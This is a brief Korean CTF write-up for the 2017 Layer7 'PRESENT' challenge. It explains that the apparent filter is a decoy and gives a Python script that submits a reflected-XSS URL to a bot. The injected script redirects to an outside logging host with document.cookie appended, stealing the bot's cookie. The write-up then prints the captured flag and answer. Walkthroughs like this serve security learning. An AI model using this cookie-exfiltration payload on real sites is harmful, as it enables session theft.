# [2017 Layer7 CTF] PRESENT - Writeup

## XSS

얼핏 소스를 보면 필터링 우회가 불가능한 문제 같지만, 그건 그냥 낚시고 사실은 XSS 문제다.

forward.php에 URL을 통해 XSS가 되게하고, 그 주소를 post.php에 전달해주면 된다.

그리고 쿠키를 탈취하면 된다.

``` python
import urllib.parse, urllib.request

def main():
	url = 'http://ctf.layer7.kr:6003/post.php'
	post_data = {
		'contents':'http://ctf.layer7.kr:6003/forward.php?contents=";document.location="http://safflower.kr/log.php?a="%2bdocument.cookie;return+"'
	}
	headers = {
		'User-Agent':'Mozilla/5.0',
		'Content-Type':'application/x-www-form-urlencoded'
	}
	req = urllib.request.Request(
		url, 
		urllib.parse.urlencode(post_data).encode(), 
		headers
	)
	res = urllib.request.urlopen(req).read().decode()

	print(res)

if __name__ == '__main__':
	main()
```
```
flag=flag{WowwOwwoWWOWWoWWOwwOW}
```

___

## Answer

flag: `WowwOwwoWWOWWoWWOwwOW`